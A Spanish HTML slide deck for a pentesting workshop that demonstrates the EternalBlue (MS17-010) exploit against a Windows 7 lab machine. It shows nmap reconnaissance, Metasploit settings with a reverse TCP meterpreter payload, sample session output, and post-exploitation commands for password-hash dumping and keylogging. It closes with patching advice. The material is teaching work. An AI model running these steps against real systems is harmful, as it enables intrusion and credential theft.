@@ -1,0 +1,332 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Taller Metasploit: Infiltración en Windows 7 (v2)</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/black.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/highlight/monokai.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;700&display=swap');
+
+        :root {
+            --r-main-font: 'Inter', sans-serif;
+            --r-main-font-size: 28px;
+            --r-heading-font: 'JetBrains Mono', monospace;
+            --color-hacker-green: #00ff41;
+            --color-cyber-blue: #00d4ff;
+            --color-error: #ff3e3e;
+            --color-gold: #ffcc00;
+            --bg-dark: #0a0a0a;
+        }
+
+        .reveal {
+            background: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(0, 255, 65, 0.05) 0%, transparent 80%),
+                linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%),
+                linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            background-size: 100% 100%, 100% 4px, 3px 100%;
+        }
+
+        .reveal .slides section {
+            text-align: left;
+            padding: 30px;
+        }
+
+        .reveal h1, .reveal h2, .reveal h3 {
+            font-family: var(--r-heading-font);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 700;
+        }
+
+        .reveal h1 { 
+            color: var(--color-hacker-green); 
+            text-shadow: 0 0 20px rgba(0, 255, 65, 0.4); 
+            text-align: center;
+            font-size: 2.5em;
+        }
+
+        .reveal h2 { 
+            color: var(--color-hacker-green); 
+            border-bottom: 3px solid var(--color-hacker-green); 
+            display: inline-block; 
+            margin-bottom: 35px;
+            padding-bottom: 10px;
+        }
+
+        .reveal h3 { 
+            color: var(--color-cyber-blue); 
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+
+        /* Information Blocks */
+        .pro-tip, .error-box, .golden-rule {
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 0.8em;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .pro-tip { 
+            background: rgba(0, 212, 255, 0.1); 
+            border-left: 5px solid var(--color-cyber-blue); 
+            color: #e0f7ff;
+        }
+
+        .error-box { 
+            background: rgba(255, 62, 62, 0.1); 
+            border-left: 5px solid var(--color-error); 
+            color: #ffe0e0;
+        }
+
+        .golden-rule { 
+            background: rgba(255, 204, 0, 0.1); 
+            border-left: 5px solid var(--color-gold); 
+            color: #fff4cc;
+        }
+
+        .icon-accent { color: var(--color-hacker-green); width: 40px; text-align: center; }
+        
+        pre { 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important; 
+            width: 100% !important; 
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        code { 
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 0.9em !important;
+        }
+
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
+        
+        .reveal ul { list-style: none; padding-left: 0; }
+        .reveal ul li { margin-bottom: 10px; }
+        .reveal ul li::before {
+            content: ">_";
+            color: var(--color-hacker-green);
+            margin-right: 15px;
+            font-family: var(--r-heading-font);
+            font-weight: bold;
+            font-size: 0.8em;
+        }
+
+        .status-bar {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            font-family: var(--r-heading-font);
+            font-size: 0.4em;
+            color: rgba(0, 255, 65, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="status-bar">
+            <span>System: Metasploit_Lab_v2</span>
+            <span>Status: Operational</span>
+        </div>
+        <div class="slides">
+            
+            <!-- Slide 1: Portada -->
+            <section data-background-color="#050505" style="text-align: center;">
+                <div style="margin-top: 60px;">
+                    <i class="fas fa-user-secret fa-4x" style="color: var(--color-hacker-green); margin-bottom: 25px; filter: drop-shadow(0 0 15px var(--color-hacker-green));"></i>
+                    <h1>PROYECTO METASPLOIT</h1>
+                    <p style="color: var(--color-cyber-blue); font-family: var(--r-heading-font); font-weight: bold;">[ PENETRATION TESTING WORKSHOP ]</p>
+                    <div style="margin: 35px auto; width: 50%; height: 1px; background: linear-gradient(90deg, transparent, var(--color-hacker-green), transparent);"></div>
+                    <p><small>Operadores: <strong>Felipe | Adrian | Jose </strong></small></p>
+                    <p><small><i class="fas fa-calendar-alt icon-accent"></i> 2026-01-26 | <i class="fas fa-shield-alt icon-accent"></i> Ethical Hacking</small></p>
+                </div>
+            </section>
+
+            <!-- Slide 2: Objetivo -->
+            <section>
+                <h2><i class="fas fa-terminal icon-accent"></i> Misión</h2>
+                <p>Análisis técnico del ciclo de explotación en sistemas Windows legacy:</p>
+                <ul style="margin-top: 15px;">
+                    <li>Enumeración activa de servicios de red.</li>
+                    <li>Identificación del vector <strong>SMBv1 (CVE-2017-0143)</strong>.</li>
+                    <li>Ejecución de RCE (Remote Code Execution).</li>
+                    <li>Post-explotación con sesión interactiva.</li>
+                </ul>
+                <div class="golden-rule">
+                    <i class="fas fa-exclamation-triangle fa-2x"></i>
+                    <div>
+                        <strong>ADVERTENCIA LEGAL:</strong> Este material es estrictamente educativo. El acceso no autorizado a sistemas informáticos es un delito.
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 3: Laboratorio -->
+            <section>
+                <h2><i class="fas fa-microchip icon-accent"></i> Lab Environment</h2>
+                <div class="grid-2">
+                    <div class="pro-tip" style="flex-direction: column; align-items: flex-start; height: 100%;">
+                        <h3><i class="fab fa-linux"></i> Atacante</h3>
+                        <ul>
+                            <li>Kali Linux 2024+</li>
+                            <li>Nmap / Arp-Scan</li>
+                            <li>Metasploit MSF</li>
+                        </ul>
+                    </div>
+                    <div class="error-box" style="flex-direction: column; align-items: flex-start; border-left-color: var(--color-cyber-blue); background: rgba(0, 212, 255, 0.05); height: 100%;">
+                        <h3 style="color: var(--color-cyber-blue);"><i class="fab fa-windows"></i> Víctima</h3>
+                        <ul>
+                            <li>Windows 7 SP1</li>
+                            <li>Vulnerable a EternalBlue</li>
+                            <li>SMBv1 Habilitado</li>
+                        </ul>
+                    </div>
+                </div>
+                <p style="text-align: center; margin-top: 25px;"><small><i class="fas fa-network-wired icon-accent"></i> Network: <code>172.30.17.0/24</code> (Isolated Lab)</small></p>
+            </section>
+
+            <!-- Slide 4: Reconocimiento -->
+            <section>
+                <h2><i class="fas fa-search icon-accent"></i> Fase 1: Discovery</h2>
+                <p>Descubrimiento de servicios con <code>Nmap</code> avanzado:</p>
+                <pre><code class="language-bash" data-trim>
+sudo nmap -p- --open -sS -sVC --min-rate 5000 -Pn 172.30.17.70 -oN scan.log
+                </code></pre>
+                <div class="pro-tip" style="font-size: 0.65em;">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <strong>TIP:</strong> Usamos <code>-sS</code> para reducir el ruido en los logs de la víctima y <code>-Pn</code> porque Windows 7 suele bloquear ICMP (ping).
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 5: Vulnerabilidad -->
+            <section>
+                <h2><i class="fas fa-biohazard icon-accent"></i> Fase 2: Análisis</h2>
+                <p>Detección del vector crítico de entrada:</p>
+                <div style="text-align: center; background: rgba(255, 62, 62, 0.05); padding: 25px; border: 1px solid rgba(255, 62, 62, 0.3); margin: 20px 0; border-radius: 8px;">
+                    <h3 style="color: var(--color-error); margin: 0; font-size: 1.2em;">VULNERABILIDAD DETECTADA</h3>
+                    <p style="font-family: var(--r-heading-font); font-size: 2em; margin: 10px 0; color: white;">MS17-010</p>
+                    <p style="color: var(--color-error); font-weight: bold; letter-spacing: 2px;">CVE-2017-0143 (ETERNALBLUE)</p>
+                </div>
+                <p><small>Afecta al manejo de paquetes SMBv1 permitiendo la ejecución de código en memoria sin credenciales.</small></p>
+            </section>
+
+            <!-- Slide 6: Explotación -->
+            <section>
+                <h2><i class="fas fa-crosshairs icon-accent"></i> Fase 3: Exploit</h2>
+                <p>Configuración del módulo en <code>msfconsole</code>:</p>
+                <pre><code class="language-bash"># Localizar y usar
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Configurar Target
+set RHOSTS 172.30.17.70
+
+# Configurar Payload (Reverse TCP)
+set LHOST 172.30.X.X  # Tu IP local
+set LPORT 4444</code></pre>
+                <p><small><i class="fas fa-cogs icon-accent"></i> Payload: <code>windows/x64/meterpreter/reverse_tcp</code></small></p>
+            </section>
+
+            <!-- Slide 7: Ejecución -->
+            <section>
+                <h2><i class="fas fa-bolt icon-accent"></i> Fase 4: Ejecución</h2>
+                <p>Lanzamiento del ataque y obtención de sesión:</p>
+                <pre><code class="language-bash">exploit
+
+[*] 172.30.17.70:445 - Target is Windows 7...
+[*] 172.30.17.70:445 - Sending exploit...
+[+] 172.30.17.70:445 - Exploit completed!
+[*] Meterpreter session 1 opened (172.30.X.X:4444 -> 172.30.17.70:49158)</code></pre>
+                <div class="pro-tip">
+                    <i class="fas fa-check-double"></i>
+                    <div>Acceso obtenido como <strong>SYSTEM</strong> (Máximos privilegios).</div>
+                </div>
+            </section>
+
+            <!-- Slide 8: Post-Explotación -->
+            <section>
+                <h2><i class="fas fa-skull icon-accent"></i> Post-Explotación</h2>
+                <p>Control total del sistema desde <code>meterpreter</code>:</p>
+                <pre><code class="language-bash">meterpreter > hashdump   # Obtener hashes de contraseñas
+meterpreter > screenshot # Captura de pantalla
+meterpreter > keyscan_start # Keylogger
+meterpreter > shell      # Acceso a CMD</code></pre>
+                <div class="error-box" style="border-left-color: var(--color-gold);">
+                    <i class="fas fa-lightbulb"></i>
+                    <div>Meterpreter reside en memoria, lo que dificulta su detección por antivirus tradicionales.</div>
+                </div>
+            </section>
+
+            <!-- Slide 9: Troubleshooting -->
+            <section>
+                <h2><i class="fas fa-wrench icon-accent"></i> Errores Comunes</h2>
+                <div class="error-box">
+                    <i class="fas fa-plug"></i>
+                    <div><strong>Conectividad:</strong> VMs en distintos adaptadores de red (NAT vs Bridge).</div>
+                </div>
+                <div class="error-box">
+                    <i class="fas fa-shield-alt"></i>
+                    <div><strong>Firewall:</strong> SMB (445) bloqueado o filtrado por reglas de red.</div>
+                </div>
+                <div class="error-box">
+                    <i class="fas fa-bug"></i>
+                    <div><strong>Blue Screen:</strong> EternalBlue puede causar BSOD si el sistema no es compatible.</div>
+                </div>
+            </section>
+
+            <!-- Slide 10: Conclusión -->
+            <section>
+                <h2><i class="fas fa-graduation-cap icon-accent"></i> Conclusiones</h2>
+                <ol>
+                    <li>La actualización de parches (MS17-010) es crítica.</li>
+                    <li>Deshabilitar servicios antiguos (SMBv1) reduce la superficie de ataque.</li>
+                    <li>El escaneo regular ayuda a prevenir intrusiones.</li>
+                </ol>
+                <div style="margin-top: 30px; text-align: center;">
+                    <p>¿Preguntas sobre el procedimiento?</p>
+                </div>
+            </section>
+
+            <!-- Slide 11: Despedida -->
+            <section style="text-align: center;">
+                <h2>SESIÓN FINALIZADA</h2>
+                <i class="fas fa-user-shield fa-5x" style="color: var(--color-hacker-green); margin: 35px 0; filter: drop-shadow(0 0 10px var(--color-hacker-green));"></i>
+                <p style="color: var(--color-cyber-blue); font-family: var(--r-heading-font);">[ SYSTEM SECURE ]</p>
+                <p><small>Felipe | Adrian | Jose</small></p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/highlight/highlight.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: 'c/t',
+            transition: 'convex',
+            width: 1100,
+            height: 750,
+            margin: 0.1,
+            plugins: [ RevealHighlight ]
+        });
+    </script>
+</body>
+</html>
